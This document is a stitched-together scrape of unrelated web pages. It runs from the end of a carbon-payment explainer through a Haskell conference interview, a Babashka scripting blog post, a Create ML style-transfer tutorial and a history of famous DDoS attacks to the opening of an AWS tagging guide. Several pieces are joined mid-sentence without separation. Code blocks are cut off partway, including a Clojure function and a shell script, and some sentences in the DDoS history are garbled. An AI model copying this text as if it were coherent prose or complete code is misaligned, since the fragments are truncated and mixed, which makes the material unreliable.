      the price of carbon.  At a price of $0.50/ton-year, some landowners begin to reduce their harvests.</span></p></div></div><div id="chapter-10"><p><span>At $1.00/ton-year, more landowners elect to participate and will reduce harvests even further.</span></p></div><div id="chapter-11"><p><span>As the price of carbon rises, <span>more landowner participation
      translates to more carbon removed from the atmosphere</span> and stored on the landscape that year.</span></p></div><div id="chapter-12"><p><span>Year over year, NCAPX offers every landowner an opportunity to reduce their timber harvest,
      remove carbon from the atmosphere, and receive payment.
      <p>Each year, payments flow efficiently to the lowest-cost carbon on the landscape.
      </p><p><span>The overall effect is to significantly increase the amount of carbon
      on the landscape relative to the "business as usual" scenario</span>.</p></span></p></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>By now, we all have learned to work with Zoom, GMeet, and other online tools. But what’s going on in the event industry? How do organizers attract speakers and grow their audience for online events? I interviewed Oli Makhasoeva – the main organizer of the biggest Haskell online event, Haskell Love Conference, in which <a href="https://serokell.io/blog/haskell-to-core">our developer Vlad had a chance to participate in</a>.</em></p><p><em>We talk about their experience organizing Haskell Love, how they kept it accessible for developers of all levels, and what things one should definitely keep in mind when organizing an online conference.</em></p><p><strong>– Hi Oli, first of all, thank you for organizing the biggest Haskell online event! How did it go from your point of view?</strong></p><p>Thank you! We were relatively lucky; no major incidents, although we had some technical challenges. On the first day, we were unable to use our remote desktop, but we were fortunate enough to have a backup. Otherwise, the conference went amazing: a lot of participation from the audience, endless chats; the statistics say we had more than 2000 unique attendees. Many people reached out directly and thanked us for the event – the Haskell community is truly friendly and welcoming. We were happy to see people having conversations during the event at the Hallway track: not only about Haskell, but also about technology and life in general.</p><p><strong>– Tell us about your team of organizers. How did you decide to work together and create the Haskell Love Conference?</strong></p><p>I am proud to say it’s a women organized conference! Most of us know each other for quite a while, from university times. We have Elena who is responsible for planning, Ida who held communications, Margarita worked with sponsors. All of them are professionals, and I am happy to have them. What’s also important, our volunteers had a wide variety of skills and did an amazing job staffing the conference and inspiring others.</p><p>The idea to organize Haskell Love came after we organized the Scala Love conference together. We thought – why not spread the love further to other communities? To achieve this goal, we started a company called <a href="https://konfy.care/">Konfy</a>. Our motto is “Konfy - make your conference comfortable”. Our conferences will always be virtual and free to attend. &lt;3
<img src="https://serokell.io/files/nf/nfjjia3k.oli.png" alt="Oli Makhasoeva"></p><p><strong>– The website says that the conference accepts people with monad-o-phobia. ;) How do you make Haskell events exciting and accessible for everyone, no matter the level of experience the audience has?</strong></p><p>Our program committee worked hard on making sure we included talks of different levels. However, we did not properly promote the level of the talks. We should have tagged all the talks and let people know the levels of the sessions. Action item for the next conference is created! We know how to make it better :)</p><p><strong>– What are the main pros and cons of online conferences vs. offline ones? Are there any specific things you did to make the online conference feel more like the offline one?</strong></p><p>Unlike offline ones, online conferences are accessible from everywhere to anyone with the internet (we even provided a low res streaming option because it was requested by someone with a weak internet connection). You can cover multiple time zones! No dietary restriction problems! Zero CO<sub>2</sub> footprint! And a bigger audience for sponsors! :) These are the advantages of virtual events.</p><p>At an offline event, we gather people in a conference room. You go to a closed place, focus on a speaker, and emerge with new insights. In the case of online events, you think: “I’ll watch a talk and do my other stuff so I don’t lose time.” But let’s be honest, it is harder to concentrate on an FP-oriented talk when you do something simultaneously. To help people to focus and to make our conference feel more like the offline one, we are trying to create an interactive and engaging environment at everyone’s home. That is, we are trying to immerse the person into the atmosphere of the conference with Q&amp;A rooms, the Hallway track, and the Twitter live stream. According to the feedback we got, we didn’t fail, but there is room for improvement.</p><p><strong>– The conference featured many impressive names such as Philip Wadler, Simon Peyton Jones, and others. How did you gather so many bright minds in one place?</strong></p><p>The Haskell community is full of enthusiasts who are willing to spend their time on a free conference and help the community. Speakers were awesome and supported our desire to gather Haskellers from around the world (also, they wanted to get our avatar 😉).</p><p><strong>– What is the most challenging thing in organizing an event like that?</strong></p><p>Building a flow for attendees: Q&amp;A sessions, the Hallway track, announcements, participation, how to move between them, and where to find information about each activity. We still need to improve that part a lot: people were confused by time zones, it wasn’t easy for them to keep track of so many places, etc.</p><p><strong>– To finish it up: what would be one piece of advice you would give to all who want to organize their own FP event?</strong></p><p>Indeed, it was challenging, and we had to scramble, so we’d like to share what we learned in order to help others who are thinking about whether and how to host large events in the coming months: facilitation is the key. Investing in tools to make the sessions as interactive as possible, call-outs for questions before/during, live polls, etc. Don’t let people be silent and just watch a video, make an experience where many people get the feel of a community. If you need help with organizing an online event, reach out to us at <a href="mailto:info@konfy.care">info@konfy.care</a>!</p><p>Many thanks to all who participated in this conference, we enjoyed it a lot and will come back next year! Follow us on <a href="https://twitter.com/_haskellove">Twitter</a> to be up to date with our plans. And don’t be upset if you missed the event, the videos are already out on <a href="https://www.youtube.com/c/Konfy">our Youtube channel</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://www.karimarttila.fi/img/2020-09-01-using-clojure-in-command-line-with-babashka_img_1.png" alt="Ordinary Clojure code"></p>

<p><em>Ordinary Clojure code - can be run in REPL or in command line with Babashka (the whole file can be found <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/bb_postgres.clj">here</a> )</em></p>

<h3 id="introduction">Introduction</h3>

<p>I never bothered to learn <a href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)">Bash</a> so that I could be really fluent with it. If I needed anything beyond basic Bash stuff I immediately used <a href="https://www.python.org/">Python</a> in command-line scripting.</p>

<p>I’m currently implementing my Clojure simple server again, this time using the <a href="https://github.com/weavejester/integrant">Integrant</a> library. In this new version, I implemented three data stores: CSV, AWS DynamoDB, and Postgres. I had already implemented importing development data into DynamoDB (using Python), this time I used <a href="https://github.com/borkdude/Babashka">Babashka</a> to import development data into Postgres - mainly just to have an excuse to try if I could replace Python with Clojure when scripting something with Bash.</p>

<p>The scripts can be found in my <a href="https://github.com/karimarttila/clojure">Clojure git</a> repo in directory <a href="https://github.com/karimarttila/clojure/tree/master/webstore-demo/integrant-simple-server/postgres">postgres</a>.</p>

<h3 id="developing-with-babashka">Developing with Babashka</h3>

<p>The really neat thing with Babashka is that you can develop your Babashka scripts as part of your Clojure project, or independently but using your favorite Clojure IDE. The picture above shows Clojure code in my favorite Clojure IDE, <a href="https://cursive-ide.com/">Cursive</a>. I have the Clojure code that imports data into the Postgres database in directory <a href="https://github.com/karimarttila/clojure/tree/master/webstore-demo/integrant-simple-server/postgres">postgres</a>, so I have the following extra path in my <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/deps.edn">deps.edn</a>:</p>

<div><div><pre><code><span> </span><span>:postgres</span><span> </span><span>{</span><span>:extra-paths</span><span> </span><span>[</span><span>"postgres"</span><span>]}</span><span>
</span></code></pre></div></div>

<p>Then the nice thing is that I can develop the Clojure code as part of project’s other Clojure code. Let’s first create a short bash script that tells Babashka to run your Clojure code with a flag so that we know in the Clojure code when we are running the code using Babashka or using Clojure IDE REPL (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-bb-load-data.sh">run-bb-load-data.sh</a>):</p>

<div><div><pre><code><span>#/bin/bash</span>

<span>export </span><span>POSTGRES_PASSWORD</span><span>=</span>simpleserver
<span>export </span><span>RUNNING_BB</span><span>=</span>TRUE
bb bb_postgres.clj
</code></pre></div></div>

<p>The flag is the <code>RUNNING_BB</code> export above.</p>

<p>Then in the Clojure code we have a top level form <code>(run-me)</code> in the namespace (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/bb_postgres.clj">bb_postgres.clj</a>):</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>run-me</span><span> </span><span>[]</span><span>
  </span><span>"Loads data only if running from Babashka script which sets the environment variable.
  We don't want the repl to load the data when reloading the namespace.
  In repl experimentation use the rich comment below."</span><span>
  </span><span>(</span><span>let</span><span> </span><span>[</span><span>running-bb?</span><span> </span><span>(</span><span>System/getenv</span><span> </span><span>"RUNNING_BB"</span><span>)]</span><span>
    </span><span>(</span><span>if</span><span> </span><span>(</span><span>=</span><span> </span><span>running-bb?</span><span> </span><span>"TRUE"</span><span>)</span><span>
      </span><span>(</span><span>import-data</span><span>))))</span><span>

</span><span>(</span><span>run-me</span><span>)</span><span>
</span></code></pre></div></div>

<p>I.e. when reloading the namespace REPL runs the code but if the flag is not set it doesn’t actually do anything - it imports the code only if we are running the code using Babashka. The reason for this is that when I reload the namespace as part of my Clojure workflow I don’t want the data import to happen. For development purposes to test importing data, or any other function, I have a <code>rich comment</code> at the end of the file:</p>

<div><div><pre><code><span>(</span><span>comment</span><span>
  </span><span>(</span><span>def</span><span> </span><span>data-dir</span><span> </span><span>"dev-resources/data"</span><span>)</span><span>
  </span><span>(</span><span>get-raw-products</span><span> </span><span>data-dir</span><span> </span><span>2</span><span>)</span><span>
  </span><span>(</span><span>get-product-groups</span><span> </span><span>data-dir</span><span>)</span><span>
  </span><span>(</span><span>do</span><span>
    </span><span>(</span><span>delete-products!</span><span>)</span><span>
    </span><span>(</span><span>delete-product-groups!</span><span>))</span><span>
  </span><span>(</span><span>vals</span><span> </span><span>(</span><span>get-users</span><span> </span><span>data-dir</span><span>))</span><span>
  </span><span>(</span><span>load-users</span><span> </span><span>(</span><span>vals</span><span> </span><span>(</span><span>get-users</span><span> </span><span>data-dir</span><span>)))</span><span>
  </span><span>(</span><span>import-data</span><span>)</span><span>
  </span><span>(</span><span>db-get-all-product-groups</span><span>)</span><span>
  </span><span>(</span><span>db-get-all-products</span><span>)</span><span>
  </span><span>)</span><span>
</span></code></pre></div></div>

<p>The <code>comment</code> block is here so that REPL does not run this code when reloading, of course. The function calls you see inside the comment block are just experiments added in no particular order. I can send any of these forms individually to be evaluated in the REPL - a typical Clojure trick when developing with REPL.</p>

<h3 id="babashka-use-cases">Babashka Use Cases</h3>

<p>I really like the idea that I can now use Clojure in shell scripting. Of course I could use Clojure in shell scripting also without Babashka but JVM boot takes quite a long time which makes testing of the script in command line a bit painful. Not so with Babashka - Babashka boots lightning fast:</p>

<div><div><pre><code>λ&gt; <span>time </span>bb <span>'(println "Hello world!")'</span>
Hello world!

real	0m0.006s
user	0m0.003s
sys	0m0.003s
</code></pre></div></div>

<p>The use cases using Babashka in my personal scripting probably is a bit like I used Babashka to import data into the Postgres database in this exercise:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>run-sql</span><span> </span><span>[</span><span>command</span><span>]</span><span>

<p>I.e. parsing CSV, transforming data, and then call some program with the transformed data, possibly read what was returned and do other stuff. You could possibly do all this using plain old Bash but I never bothered to learn Bash in that level that I can do more than test some flags and call other programs using Bash.</p>

<h3 id="how-do-i-use-the-babashka-script-in-this-exercise">How Do I Use the Babashka Script in This Exercise?</h3>

<p>I used Babashka to load development data into the Postgres data store. During development I built a custom Postgres image and provided a <a href="https://github.com/casey/just">Just</a> recipe to start the data store (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/Justfile">Justfile</a>):</p>

<div><div><pre><code><span># Start local postgres</span>
@postgres:
    <span>cd </span>postgres <span>&amp;&amp;</span> ./run-docker-compose.sh
</code></pre></div></div>

<p>The <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-docker-compose.sh">run-docker-compose.sh</a> starts the Postgres docker container, creates the schema and finally calls <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-bb-load-data.sh">./run-bb-load-data.sh</a> which loads the data into the development Postgres data store:</p>

<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>echo</span> <span>"NOTE: Remember to destroy the container if running again!"</span>
<span>echo</span> <span>"Starting docker compose..."</span>

<span>echo</span> <span>"Loading data..."</span>

</code></pre></div></div>

<h3 id="clojure-babashka-vs-python-in-shell-scripting">Clojure (Babashka) vs Python in Shell Scripting</h3>

<p>Let’s finally compare Python and Clojure (Babashka) when doing some Linux shell scripting.</p>

<p><strong>Easiness</strong>. Both languages are pretty easy and fast to work if you have used them. Developing Python scripts is pretty fast - you just run the script in command line. Working with Clojure has one additional plus: you can use the Clojure REPL.</p>

<p><strong>Library support</strong>: Python wins. When you are scripting in Python and you realize that it would be nice e.g. to use some AWS library - just use it (e.g. <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/dynamodb/pysrc/table_importer.py">table_importer.py</a> - the AWS <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/index.html">boto3</a> library). The library support for Babashka is not as extensive, of course - but Babashka supports quite many namespaces outside <code>clojure.core</code> and also some additional libraries: <a href="https://github.com/borkdude/babashka#built-in-namespaces">Babashka built-in namespaces</a> - keep eye on that page, maybe Babashka library support is growing in the future!</p>

<p>So, the library support might not be as good as with Python. But I really do love Clojure and if I’m implementing apps using Clojure it is really nice to do some ad hoc scripting using Babashka.</p>

<h3 id="conclusions">Conclusions</h3>

<p>It’s nice to have another scripting tool in my toolbox: <a href="https://github.com/borkdude/babashka">Babashka</a>. Time will tell if I start using Clojure instead of Python as my preferred scripting language, thanks to Babashka. At least in this exercise Babashka did really well.</p>

It’s also can be handy or data augmentation.</p><p id="3007"><a href="https://developer.apple.com/videos/play/wwdc2020/10642/#:~:text=Style%20Transfer%20is%20a%20new,style%20and%20content%20image%20together." target="_blank" rel="noopener">At WWDC 2020, Create ML</a> (Apple’s model building framework) got a big boost with the inclusion of style transfer models. Though it’s shipped with the Xcode 12 update, you’ll need macOS Big Sur (in beta at the time of writing) to train style transfer models.</p><p id="4658">Create ML has now unlocked the potential to train style transfer models right from your MacBook. You can train both image and video style transfer convolutional neural networks, with the latter using only a limited set of convolution filters to make it optimized for real-time image processing.</p><p id="3a4c">To get started, you need three things:</p><ul><li id="21c8">A styling image (also called a style reference image). Typically, you can use famous paintings or abstract art images to let your model learn and impart the style from. In our case, we’ll be using a pencil sketch image in our first model (check the screenshot below).</li><li id="cf98">A validation image that helps visualize model quality during the training process.</li><li id="bad2">Dataset of content images that act as our training data. To get optimal results, it’s best to work with a directory of images similar to ones you’d use while running inference.</li></ul><p id="825a">In this article, I’ll be using <a href="https://www.kaggle.com/jessicali9530/celeba-dataset" target="_blank" rel="noopener">this celebrity image dataset</a> as our content images.</p><p id="2bec">Here’s a glimpse at how my Create ML style transfer settings tab looked before training the model.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3048/1*7CZv5HvelAReQ9CTDCmJ7g.png" width="1524" height="855" srcset="https://miro.medium.com/max/552/1*7CZv5HvelAReQ9CTDCmJ7g.png 276w, https://miro.medium.com/max/1104/1*7CZv5HvelAReQ9CTDCmJ7g.png 552w, https://miro.medium.com/max/1280/1*7CZv5HvelAReQ9CTDCmJ7g.png 640w, https://miro.medium.com/max/1456/1*7CZv5HvelAReQ9CTDCmJ7g.png 728w, https://miro.medium.com/max/1632/1*7CZv5HvelAReQ9CTDCmJ7g.png 816w, https://miro.medium.com/max/1808/1*7CZv5HvelAReQ9CTDCmJ7g.png 904w, https://miro.medium.com/max/1984/1*7CZv5HvelAReQ9CTDCmJ7g.png 992w, https://miro.medium.com/max/2000/1*7CZv5HvelAReQ9CTDCmJ7g.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*7CZv5HvelAReQ9CTDCmJ7g.png?q=20"></p></div></div></div></figure></div></div></div><div><p id="5258">The validation image below shows real-time style transfer applied at each iteration interval.

Typically, the style loss should decrease over time, showing that the neural network is learning to adopt the artistic traits of the style image.</p><p id="d365">While the default model parameters work great, Create ML allows us to customize them for specific use cases.</p><p id="3cf8">The low style strength parameter tuned only the parts of the background with the style image, thereby keeping the primary subject intact. At the same time, setting the style strength parameter to high would impart more style textures on the edges of the image.</p><p id="3d53">Similarly, coarse style density uses high-level details of the style image (such models are trained much faster), whereas fine density lets the model learn minute details.</p><p id="f797">Create ML style transfer models train with a default number of iterations set to 500, which is ideal for most use cases. Iterations are the number of batches needed to complete one epoch. One epoch equals one training cycle of the entire dataset. For example, if the training dataset consists of 500 images and the batch size is 50, it indicates that 10 iterations will complete one epoch (note: Create ML model training doesn’t tell you the batch size).</p><p id="3964">This year, Create ML also introduced a new feature called model snapshots. These allow us to capture intermediate Core ML models during training and export them into your apps. However, models used from snapshots aren’t optimized for size and are significantly larger than the ones generated on training completion (specifically, the snapshots I took had Core ML model sizes in the range of 5–6 MB, whereas the final model size was 596 KB).</p><p id="2872">The following gif shows one such example, where I’ve compared model snapshot results across different iterations:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1618/1*PyPIjKVJTV-piFo4TAdMug.gif" width="809" height="480" srcset="https://miro.medium.com/max/552/1*PyPIjKVJTV-piFo4TAdMug.gif 276w, https://miro.medium.com/max/1104/1*PyPIjKVJTV-piFo4TAdMug.gif 552w, https://miro.medium.com/max/1280/1*PyPIjKVJTV-piFo4TAdMug.gif 640w, https://miro.medium.com/max/1400/1*PyPIjKVJTV-piFo4TAdMug.gif 700w" sizes="700px" data-old-src="https://miro.medium.com/freeze/max/60/1*PyPIjKVJTV-piFo4TAdMug.gif?q=20"></p></div></div></div><figcaption>The girl is an actress. The guy is me.</figcaption></figure><p id="f027">Do note how on one of the images, the style isn’t composed on the complete image. This is because the styling image used was of a smaller size. Hence, the network wasn’t able to learn enough style information, causing the composed image to be of sub-par quality.</p><p id="fb1c">Ideally, having a minimum size of 512 px for the style image will ensure good results.</p></div></div></section><hr><section></section><hr><section><div><div><p id="5ca4">In the following sections, we will build an iOS application that runs style transfer models in <em>real-time. </em>Here’s a bird’s eye view of our next steps:</p><ul><li id="8b11">Analyze results across three video style transfer neural network models.

You can draw custom overlays, fine-tune the camera settings, do photo segmentation with the depth outputs, and analyze frames.</p><p id="f2ce">We’ll primarily focus on analyzing frames, and specifically transforming them using style transfer, and displaying them in an image view to build a live camera feed (you can also use Metal for further optimization, but for the sake of simplicity, we’ll skip that for this tutorial).</p><p id="2822">At a very basic level, building a custom camera involves the following components:</p><ul><li id="3e32"><code>AVCaptureSession</code> — this manages the whole session of the camera. Its functionality involves getting access to the iOS input devices and passing the data to output devices. AVCaptureSession also lets us define <code><a href="https://developer.apple.com/documentation/avfoundation/avcapturesession/preset" target="_blank" rel="noopener">Preset</a></code> types for different capture sessions.</li><li id="b71f"><code>AVCaptureDevice</code> — lets us select the front or back camera. We can either pick the default settings or use <code>AVCaptureDevice.DiscoverySession</code> to filter and select hardware-specific features, such as the TrueDepth or WideAngle cameras.</li><li id="0355"><code>AVCaptureDeviceInput</code> — this provides the media source(s) from a capture device and sends it to the capture session.</li><li id="7e56"><code>AVCaptureOutput</code> — an abstract class that provides the output media to the capture session. It also lets us handle the camera orientation. We can set multiple outputs (such as for camera and microphone). For example, if you’re looking to capture photo and movies, add <code>AVCaptureMovieFileOutput</code> and <code>AVCapturePhotoOutput</code>. In our case, we’ll be using <code>AVCaptureVideoDataOutput</code> , as it provides video frames for processing.</li><li id="38cf"><code>AVCaptureVideoDataOutputSampleBufferDelegate</code> is a protocol we can use to access every frame buffer inside the <code>didOutput</code> delegate method. In order to start receiving frames, we need to invoke the <code>setSampleBufferDelegate</code> method on <code>AVCaptureVideoDataOutput</code></li><li id="909e"><code>AVCaptureVideoPreviewLayer</code> — basically a <code>CALayer</code> that visually displays the live camera feed from the output of the capture session. We can transform the layer with overlays and animations. It’s important to set this for the sample buffer delegate methods to work.</li></ul><p id="f171">To start off, add the <code>NSCameraUsageDescription</code> camera permission in your project’s <code>info.plist</code> file in Xcode.</p><p id="36f3">Now, it’s time to create an <code>AVCaptureSession</code> in the <code>ViewController.swift</code> :</p><pre><span id="f86b">let captureSession = AVCaptureSession()<br>captureSession.sessionPreset = AVCaptureSession.Preset.medium</span></pre><p id="cc2b">Next, we’ll filter and select the wide-angle camera from the list of available camera types present in the <code>AVCaptureDevic</code> instance and add it to the <code>AVCaptureInput</code>, which in turn is set on the <code>AVCaptureSession</code>:</p><figure><div></div></figure><p id="dfa7">Now that our input is set, let's add our video output to the capture session:</p><pre><span id="9efa">let videoOutput = AVCaptureVideoDataOutput()</span><span id="d315">videoOutput.alwaysDiscardsLateVideoFrames = true</span><span id="7dfa">videoOutput.<strong>setSampleBufferDelegate</strong>(self, queue: DispatchQueue(label: "videoQueue"))</span><span id="e234">if captureSession.canAddOutput(videoOutput){<br> <strong>captureSession.addOutput(videoOutput)</strong><br>}</span></pre><p id="0a64">The <code>alwaysDiscardsLateVideoFrames</code> property ensures that frames that arrive late are dropped, thereby ensuring there’s less latency.</p><p id="6fda">Finally, add the following piece of code to prevent a rotated camera feed:</p><pre><span id="4de3">guard let connection = videoOutput.connection(with: .video) <br>else { return }</span><span id="68ca">guard connection.isVideoOrientationSupported else { return }<br>connection.videoOrientation = .portrait</span></pre><blockquote><p id="33e9">Note: In order to ensure all orientations, you need to set the <code>videoOrientation</code> based on the device’s current orientation.

<p>In our blog, we’ve already talked about what DDoS attack is, how a DDoS attack is created, the main types, and most importantly, what methods are used to protect against them.</p>



<p><a href="https://utopia.fans/networks/ddos-attack-what-it-is-and-how-to-trace-a-ddos-attack/"><em>DDoS Attack: What It Is And How To Trace A DDoS Attack?</em></a><em> We recommend reading this introductory article first to make sure you understand the main principle of such attacks.</em></p>



<p>However, today we would like to recall the most famous and powerful attacks in history. As the proverb says: “Learn history so that it doesn’t happen again.” Or at least so that you know what to do in a given situation.</p>



<p>So today, we’ll consider a list of the top and unexpected biggest DDoS attacks in history.</p>



<p><em>Read</em><a href="https://utopia.fans/privacy/fully-fledged-guide-on-ways-to-protect-your-data-online/"><em> </em><em>Fully-Fledged Guide On Ways To Protect Your Data Online</em></a><em>. Use maximum protection in the Internet space.</em></p>



<h3>DDoS in the last century</h3>



<p>In the early 1990s, DDoS in the form of SYN flood technology (sending “garbage” requests to the operating system to establish a TCP connection) was sacred. It was passed from mouth-to-mouth and used mostly for mischievous purposes, without much success or resonance.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS.jpg.webp" alt="The biggest DDoS attack in history" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS-300x150.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>It was not until 1996 that the CERT, Coordination center at Carnegie Mellon University, published recommendations to counter the SYN flood, thus officially recognizing the problem.</p>



<p>The reason was the first large-scale attack on the largest Internet provider in New York — Panix Networks. It was a commercial attack organized by spammers. They took revenge on Panix for not allowing them to send junk advertising messages to users.</p>



<p>In 1996, a set of free tools with source code for DDoS implementation was published for the first time. This tool was tested two years later at the University of Michigan when the second major DDoS attack took place.</p>



<p>Here’s an interesting fact: the University of Michigan is located in Ann Arbor, where Arbor Networks (one of the leading manufacturers of equipment for countering DDoS) came from. The company’s history began with several research papers written at this university in the wake of the sensational attack.</p>



<p>In 2000, a 15-year-old hiding under the nickname MafiaBoy overturned the most visited sites in the world at that time: eBay, CNN, Dell, Yahoo, Amazon, etc. The online community was in a panic. It seemed that the Internet Apocalypse was coming.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy.jpg.webp" alt="Largest DDoS attack in history" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy-300x205.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>It was at the time the largest DDoS attack in history.</p>

<h3>New era</h3>



<p>The Internet, as you can see, is not broken. The industry has learned to resist hackers.</p>



<p>But already in 2001, the technique of the attacks was greatly improved. The first serious attacks of the application-level were launched. When such an attack was made on a network resource containing a vulnerability (an “amplifier”), the system sent a request. Then it was repeatedly replicated by this server and redirected to the victim’s resource.</p>



<p>In 2003, DDoS reached Russia, bringing an attack on MasterHost, the largest website hosting provider in the country at that time.</p>



<p>In 2004, Cisco System absorbed the Israeli developer of attack prevention tools Riverhead Networks. Thanks to this purchase, it created the first successful commercial product for fighting DDoS — Cisco Guard.</p>



<p>A serious arms race began, and the criminal DDoS market was finally formed — with hacker coalitions, competitive wars, and fabulous earnings.</p>



<p>The scale of attacks began to increase exponentially: in 2010, the speed of the most powerful attack exceeded 100 Gbit/s; in 2013 it was 300 Gbit/s. In 2016, there were confirmed reports of attacks exceeding one Tbit/s.</p>



<h3>The biggest DDoS attacks in history</h3>



<p><strong><u>Estonia in April 2007</u></strong></p>



<p>Following official Moscow, representatives of Russian Pro-government youth movements were outraged by the transfer of the “Bronze Soldier in Tallinn”, a World War II monument, from Tallinn’s center to the military cemetery. Simultaneously with information campaigns on the internet (which activists called “blasphemy”) and a series of street actions, a flurry of DDoS attacks hit the websites of publications, banks, and departments in Estonia.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier.jpg.webp" alt="DDoS attack of the new age" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier-300x204.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>Powerful DDoS attacks on the Estonian Internet only fueled the protest. The population of Estonia, which at that time was considered almost the most internalized in the world, was periodically left without access to government resources, online publications, websites of banks, and organizations for almost three weeks.</p>



<p><strong><u>War in Georgia: DDoS as a weapon</u></strong></p>



<p>In the course of the conflict in South Ossetia, Pro-Russian hackers have again supported official Moscow’s position. Their Georgian colleagues did not remain in debt — the parties tried to drown out each other’s news with DDoS attacks. The websites of the Georgian and Ossetian authorities were also affected.</p>



<p><strong><u>Iran vs iPOS</u></strong></p>



<p>In 2013, during the presidential election in Iran, almost the only company that independently tracks voters’ opinions was the American iPOS, located in McLane, Virginia, near the CIA’s headquarters. The world’s leading media referred to its survey data from Iran. The company’s website was very popular among Iranians, and as the election approached, it was increasingly attacked by unknown hackers.</p>



<p><strong><u>North Korea is offline</u></strong></p>



<p>In 2014, as a result of an attack by Pro-American hackers, North Korea lost its already meager access to the worldwide web. This DDoS was a response to the hacking of the website of Sony Pictures Entertainment, the distributor of the film, which mocked the North Korean leader.</p>



<p>Of course, ordinary residents of North Korea did not feel the problem, since only representatives of the party elite, special services, certain departments, universities, scientific organizations, and employees of foreign embassies and firms have access to the internet.</p>



<p><strong><u>Mirai</u></strong></p>



<p>On the eve of the USA’s presidential election, Hillary Clinton and Donald Trump were attacked the websites of two main candidates simultaneously. A month earlier, the same botnet was already used in an attack on the DNS provider Dyn.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai.jpg.webp" alt="Mirai DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai-300x200.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>On October 21, 2016, American Internet users began to complain about many popular sites: Twitter, Facebook, Reddit, Spotify, PayPal, Pinterest, Github, Airbnb, Amazon, and others. The problem also affected residents of Europe, including Russia — problems even reached several cities in India.</p>



<p>The reason for the massive failure was a DDoS attack on the DNS server provider Dyn. The garbage traffic that choked the Dyn servers came from Linux-based household devices infected with the Mirai virus. The botnet has been joined by routers and smart kettles, microwaves, Webcams, printers, refrigerators, and baby monitors-several million of the most unexpected household appliances connected to the Internet.</p>

<p>Once <a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">you have adopted an AWS tagging strategy</a>, you’ll need to make sure that all your existing AWS resources and any new ones you create abide by it. Consistency is the key - if you don’t proactively enforce your AWS tagging strategy, you’ll always be playing catch up and chasing down team members to make sure they add the right tags to their resources.</p>

<p>While you can apply AWS tags to your resources manually using the <a href="https://docs.aws.amazon.com/cli/latest/reference/resourcegroupstaggingapi/tag-resources.html" target="_blank">AWS CLI</a> or <a href="https://docs.aws.amazon.com/ARG/latest/userguide/tag-editor.html" target="_blank">AWS Tag Editor</a>, you’ll probably find this cumbersome and error-prone at scale. A better approach is to automatically apply AWS tags to your resources and use rules to enforce their consistent usage.</p>

<p>Depending on the tool you use to maintain your infrastructure on AWS, your method of proactively enforcing AWS tags on new resources may vary. In this guide, I’ll highlight two tools: Terraform and AWS CloudFormation. You’ll see how to use each to create and update AWS cost allocation tags on your resources and then enforce the proper use of specific tags for new resources. By proactively enforcing your AWS tagging strategy, you’ll minimize your time spent auditing and correcting improper AWS tags and force developers to learn best AWS tagging best practices for your environment.</p>



<p>The first infrastructure management tool I’ll cover is <a href="https://www.terraform.io/" target="_blank">Terraform</a>. Terraform works across a variety of cloud hosting providers to help you provision and maintain your AWS resources. With Terraform, you can define your servers, databases, and networks in code and apply your changes programmatically to your AWS account.</p>

<p>If you’re new to Terraform, they have a well-documented <a href="https://learn.hashicorp.com/terraform/getting-started/intro" target="_blank">Getting Started guide</a> and several <a href="https://github.com/terraform-providers/terraform-provider-aws/tree/master/examples" target="_blank">AWS template examples on GitHub</a>. In this section, I’ll show you some snippets from a demo Terraform project and module that <a href="https://github.com/CloudForecast/cf-terraform-demo" target="_blank">is available on GitHub</a>. You’ll learn the following in this Terraform AWS tags:</p>

<ol>
  <li>Tag a New AWS EC2 Instance with Terraform</li>
